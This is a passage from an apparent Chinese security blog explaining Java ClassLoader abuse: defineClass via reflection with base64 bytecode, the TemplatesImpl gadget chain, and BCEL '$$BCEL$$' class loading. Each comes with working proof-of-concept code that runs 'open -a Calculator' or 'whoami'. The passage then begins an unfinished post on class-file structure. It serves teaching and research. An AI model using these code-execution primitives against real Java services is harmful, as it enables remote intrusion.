loadClass的作用是从已加载的类缓存，父加载器等位置寻找(双亲委派机制)，在前面没有找到的情况下，执行findClass</span><br><span class="line">[<span class="number">2</span>] findClass的作用是根据URL指定的方式来加载类的字节码，可能会在本地系统，jar包或远程http服务器上读取字节码，然后将其交给defineClass</span><br><span class="line">[<span class="number">3</span>] defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类</span><br></pre></td></tr></table></figure><p>编译恶意类的class文件，然后用defineClass去加载它。需要注意的是，ClassLoader#defineClass返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以需要想办法调用返回的类的构造函数来执行命令。在实际场景中，由于defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是攻击链TemplatesImpl的基石。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClassLoaderTest</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwABwAIBwAXDAAYABkBACtvcGVuIC1hIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAaABsBAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAABwAEAAgADQAJAAsAAAAEAAEADAABAA0AAAACAA4&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Evil</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        Evil.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/14/ClassLoader/1708350702793-8e3a7547-5323-4685-b71f-a810642f476b.png"></p><h3 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a><font style="color:rgb(36, 41, 46);">TemplatesImpl加载字节码</font></h3><p><font style="color:rgb(36, 41, 46);">上文提到了，</font><font style="color:rgb(36, 41, 46);">ClassLoader#defineClass</font><font style="color:rgb(36, 41, 46);">方法只能通过反射调用，在实际环境中很难有利用场景。在</font><font style="color:#080808;">com.sun.org.apache.xalan.internal.xsltc.trax.</font><font style="color:rgb(36, 41, 46);">TemplatesImpl</font><font style="color:rgb(36, 41, 46);">类中的内部类</font><font style="color:rgb(36, 41, 46);">TransletClassLoader</font><font style="color:rgb(36, 41, 46);">重写了</font><font style="color:rgb(36, 41, 46);">defineClass</font><font style="color:rgb(36, 41, 46);">，并且该处没有显式地声明其定义域。在</font><font style="color:rgb(36, 41, 46);">Java</font><font style="color:rgb(36, 41, 46);">中，默认情况下，如果一个方法没有显式声明作用域，则其作用域为</font><font style="color:rgb(36, 41, 46);">default</font><font style="color:rgb(36, 41, 46);">，也就是说这里的</font><font style="color:rgb(36, 41, 46);">defineClass</font><font style="color:rgb(36, 41, 46);">由其父类的</font><font style="color:rgb(36, 41, 46);">protected</font><font style="color:rgb(36, 41, 46);">类型变成了一个允许被外部调用的</font><font style="color:rgb(36, 41, 46);">default</font><font style="color:rgb(36, 41, 46);">类型方法。</font></p><p><img src="/2023/04/14/ClassLoader/1708351381670-6e7fdb31-97f7-4697-b715-458fca5c4961.png"></p><p><img src="/2023/04/14/ClassLoader/1708353018114-0d9f1b98-84f0-4390-b14e-c0a5e4dfd8c2.png"></p><p><font style="color:rgb(36, 41, 46);">但是</font><font style="color:rgb(36, 41, 46);">TransletClassLoader</font><font style="color:rgb(36, 41, 46);">是内部类，只允许</font><font style="color:rgb(36, 41, 46);">TemplatesImpl</font><font style="color:rgb(36, 41, 46);">类中的方法调用，跟进一下发现</font><font style="color:rgb(36, 41, 46);">TemplatesImpl</font><font style="color:rgb(36, 41, 46);">类中只有方法</font><font style="color:rgb(36, 41, 46);">TemplatesImpl#defineTransletClasses</font><font style="color:rgb(36, 41, 46);">用到了</font><font style="color:rgb(36, 41, 46);">TransletClassLoader</font><font style="color:rgb(36, 41, 46);">类，但是</font><font style="color:rgb(36, 41, 46);">TemplatesImpl#defineTransletClasses</font><font style="color:rgb(36, 41, 46);">方法是</font><font style="color:rgb(36, 41, 46);">private</font><font style="color:rgb(36, 41, 46);">类型。</font></p><p><img src="/2023/04/14/ClassLoader/1708361897796-5fcf8776-46a6-4869-a3dc-57b634525cfc.png"></p><p><img src="/2023/04/14/ClassLoader/1708362057937-dd53fa0c-69ad-4e28-820e-7c0f9bfcca9d.png"></p><p>继续跟一下<font style="color:rgb(36, 41, 46);">TemplatesImpl#defineTransletClasses</font><font style="color:rgb(36, 41, 46);">方法，一共有三个方法调用了它。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/14/ClassLoader/1708364858623-13d3a976-4631-44dc-801d-3609f3193ca0.png"></p><p>接着上面的三个利用点进一步分析，getTransletIndex方法可以直接作为一个触发的点，但是测试后并没有成功触发，而getTransletClasses方法在TemplatesImpl类中已经没有继续被调用了，因此只剩下getTransletInstance方法，再跟一下发现TemplatesImpl#newTransformer方法调用了它，这里也可以作为一个触发点，继续跟下去发现TemplatesImpl#getOutputProperties方法调用了TemplatesImpl#newTransformer方法，因此这里也可以作为一个触发点。</p><p><img src="/2023/04/14/ClassLoader/1708366322999-da5160fc-e98e-40c7-a37f-2bd77a58000b.png"></p><p><img src="/2023/04/14/ClassLoader/1708366425326-5498f1e8-94af-4600-91ec-9c68249e72c4.png"></p><p>由上可以得到两条调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt;TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()  </span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>] TemplatesImpl#getOutputProperties() -&gt;TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt;TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass() </span><br></pre></td></tr></table></figure><p>那么为什么getTransletIndex方法无法触发呢？上文说到，在defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使将初始化代码放在类的static块中，在defineClass时也无法被直接调用到。所以，如果要使用defineClass在目标机器上执行任意代码，需要想办法调用构造函数。对于getTransletIndex方法，虽然有执行到defineClass，但后面并没有对这个类对象进行实例化，也就是说并没有调用其构造函数，因此无法触发漏洞。反观TemplatesImpl#newTransformer方法，在调用完TemplatesImpl#defineTransletClasses方法后又调用了newInstance构造函数，所以能够完成后续操作，触发恶意代码。</p><p><img src="/2023/04/14/ClassLoader/1708366907124-0836d695-de67-40f8-9bee-3f39280366ff.png"></p><p><img src="/2023/04/14/ClassLoader/1708366858398-3af3671c-0818-4eb3-a47c-475cae281656.png"></p><p>在构造利用链的过程中，还需注意以下几点：</p><ol><li>TemplatesImpl中对加载的字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类</li></ol><p><img src="/2023/04/14/ClassLoader/1708368360450-078310aa-d7a1-454e-9ef0-64a13270357f.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTest</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>TemplatesImpl中_name属性值必须不为null</li></ol><p><img src="/2023/04/14/ClassLoader/1708368498181-e4900389-7d91-41d9-bd27-58e13afc4b89.png"></p><ol start="3"><li><font style="color:rgb(51, 51, 51);">TemplatesImpl</font><font style="color:rgb(51, 51, 51);">中</font><font style="color:rgb(51, 51, 51);">_tfactory</font><font style="color:rgb(51, 51, 51);">属性值必须是</font><font style="color:rgb(51, 51, 51);">TransformerFactoryImpl</font><font style="color:rgb(51, 51, 51);">实例</font></li></ol><p><img src="/2023/04/14/ClassLoader/1708368655234-f91fbfa9-fab6-4a2f-97e3-17c7fcec11ce.png"></p><p>TemplatesImpl完整利用链如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplClassLoaderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(org.example.classloader.EvilTest.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;EvilTest&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/14/ClassLoader/1708368126498-07118fd7-2368-4cb5-a46f-f9dfc17c4dc2.png"></p><h3 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h3><p><a href="https://commons.apache.org/proper/commons-bcel/">BCEL</a><font style="color:rgb(51, 51, 51);">是一个用于分析、创建和操纵</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">类文件的工具库，</font><font style="color:rgb(51, 51, 51);">Oracle JDK</font><font style="color:rgb(51, 51, 51);">引用了</font><font style="color:rgb(51, 51, 51);">BCEL</font><font style="color:rgb(51, 51, 51);">库，不过将原包名</font><font style="color:rgb(51, 51, 51);">org.apache.bcel.util.ClassLoader</font><font style="color:rgb(51, 51, 51);">修改为</font><font style="color:rgb(51, 51, 51);">com.sun.org.apache.bcel.internal.util.ClassLoader</font><font style="color:rgb(51, 51, 51);">，</font><font style="color:rgb(51, 51, 51);">BCEL</font><font style="color:rgb(51, 51, 51);">的类加载器在解析类名时会对</font><font style="color:rgb(51, 51, 51);">ClassName</font><font style="color:rgb(51, 51, 51);">中有</font><font style="color:rgb(51, 51, 51);">$$BCEL$$</font><font style="color:rgb(51, 51, 51);">标识的类做特殊处理，该特性经常被用于编写各类攻击</font><font style="color:rgb(51, 51, 51);">Payload</font><font style="color:rgb(51, 51, 51);">。</font></p><h4 id="BCEL兼容性问题"><a href="#BCEL兼容性问题" class="headerlink" title="BCEL兼容性问题"></a><font style="color:rgb(51, 51, 51);">BCEL兼容性问题</font></h4><p>Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：JDK1.5-1.7、JDK8-JDK8u241、JDK9，BCEL Classloader在JDK8u251之前是在rt.jar里面。<br>    同时在Tomcat中也会存在相关的依赖：</p><ol><li>Tomcat7：org.apache.tomcat.dbcp.dbcp.BasicDataSource</li><li>Tomcat8及其以后：org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li></ol><p><font style="color:rgb(51, 51, 51);">B</font>CEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始org.apache.bcel.classfile.ConstantUtf8#setBytes就已经过时了，因此利用时需要注意JDK版本是否JDK8u251之后的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes the raw bytes of this Utf-8</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span> (since 6.0)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@java</span>.lang.Deprecated</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setBytes</span><span class="params">( <span class="keyword">final</span> String bytes )</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="BCEL攻击原理"><a href="#BCEL攻击原理" class="headerlink" title="BCEL攻击原理"></a>BCEL攻击原理</h4><p>BCEL包中有一个类com.sun.org.apache.bcel.internal.util.ClassLoader重写了Java内置的ClassLoader#loadClass方法，在重写的方法中，会判断类名是否是$$BCEL$$开头，如果是的话，接着调用createClass方法拿到一个JavaClass对象，最终通过defineClass加载字节码还原类。</p><p><img src="/2023/04/14/ClassLoader/1708587531918-1e4a2c24-9764-4ef4-bc57-733eb017d7a1.png"></p><p>跟进com.sun.org.apache.bcel.internal.util.ClassLoader#createClass方法，可以看到其获取JavaClass对象时，会进行一个decode操作。</p><p><img src="/2023/04/14/ClassLoader/1708588090921-df8526bb-38e5-47be-8809-edec2655a873.png"></p><p>对于encode操作，直接调用<font style="color:#080808;background-color:#ffffff;">com.sun.org.apache.bcel.internal.classfile.Utility#encode</font><font style="color:#080808;background-color:#ffffff;">方法来加密恶意类即可。</font></p><p><img src="/2023/04/14/ClassLoader/1708588314594-7b857808-c8b8-4e8c-a1cf-ca52e61814cc.png"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELClassLoaderTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取class</span></span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">            System.out.println(Arrays.toString(javaClass.getBytes()));</span><br><span class="line">            <span class="comment">// 编码为bcel格式</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 加载类: 调用 exec 方法执行命令</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">command</span> <span class="operator">=</span> (Process) <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, <span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            <span class="comment">// 读取数据</span></span><br><span class="line">            System.out.println(getCommandResult(command));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取命令执行的结果</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCommandResult</span><span class="params">(Process process)</span> &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                res = res.concat(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/14/ClassLoader/1708590393401-629079d3-cdf7-4b70-b488-36f6f7eb707a.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java字节码</title>
      <link href="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">源文件（</font><font style="color:rgb(51, 51, 51);"><em>.java</font><font style="color:rgb(51, 51, 51);">）在经过编译后会变成</font><font style="color:rgb(51, 51, 51);">class</font><font style="color:rgb(51, 51, 51);">文件（</font><font style="color:rgb(51, 51, 51);"></em>.class</font><font style="color:rgb(51, 51, 51);">），</font><font style="color:rgb(51, 51, 51);">class</font><font style="color:rgb(51, 51, 51);">文件有着固定的二进制格式，即字节码。字节码是一套设计用来在</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">虚拟机中执行的高度优化的指令集，由十六进制值组成，</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">以两个十六进制为一组，按照字节为单位进行读取。</font></p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708089657851-8a16911f-df11-4fe2-b35f-3d97201b2ade.png"></p><p>Java源文件的编译解析流程如下图所示。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708087891985-cb874858-522b-4e83-a49b-353928253c19.png"></p><h2 id="字节码结构"><a href="#字节码结构" class="headerlink" title="字节码结构"></a>字节码结构</h2><p>JVM对于字节码有着严格规范要求，每个字节码文件都要由十部分按照规定的顺序组成，分别为魔数（magic）、版本号（version）、常量池（constant pool）、访问标记（access flag）、类索引（this class）、超类索引（super class）、接口表索引（interface）、字段表（fields）、方法表（methods）和属性表（attributes）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4             magic;</span><br><span class="line">    u2             minor_version;</span><br><span class="line">    u2             major_version;</span><br><span class="line">    u2             constant_pool_count;</span><br><span class="line">    cp_info        constant_pool[constant_pool_count-1];</span><br><span class="line">    u2             access_flags;</span><br><span class="line">    u2             this_class;</span><br><span class="line">    u2             super_class;</span><br><span class="line">    u2             interfaces_count;</span><br><span class="line">    u2             interfaces[interfaces_count];</span><br><span class="line">    u2             fields_count;</span><br><span class="line">    field_info     fields[fields_count];</span><br><span class="line">    u2             methods_count;</span><br><span class="line">    method_info    methods[methods_count];</span><br><span class="line">    u2             attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="魔数"><a href="#魔数" class="headerlink" title="魔数"></a>魔数</h3><p>所有的class文件的前四个字节都是魔数，固定值为0xCAFEBABE，JVM可以根据文件的开头来判断这个文件是否可能是一个class文件，判断通过后才会进行后续的操作。</p><h3 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h3><p>魔数之后的四个字节为版本号，前两个字节表示次版本号（Minor Version），后两个字节表示主版本号（Major Version）。例如00 00 00 34中次版本号转换成十进制为0，主版本号转换成十进制为52，所以编译该文件的JDK版本号为1.8。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708104398855-be6fc49b-6473-48c8-90ac-1e87e75832fe.png"></p><h3 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h3><p>版本号后的字节为常量池，常量池中存储着两类常量，分别是字面量与符号引用。<font style="color:rgb(51, 51, 51);">字面量为代码中声明为</font><font style="color:rgb(51, 51, 51);">Final</font><font style="color:rgb(51, 51, 51);">的常量值，符号引用为类和接口的全局限定名、字段的名称和描述符、方法的名称和描述符。</font></p><p><font style="color:rgb(51, 51, 51);">常量池分为两部分，分别为常量池计数器和常量池数据区。</font></p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708108177749-68e6e5ad-b8df-4374-92ed-a85cff745e0f.png"></p><ul><li>常量池计数器（constant_pool_count）：由于常量的数量不固定，所以需要先放置两个字节来表示常量池容量计数值。例如字节码前10个字节为CA FE BA BE 00 00 00 34 00 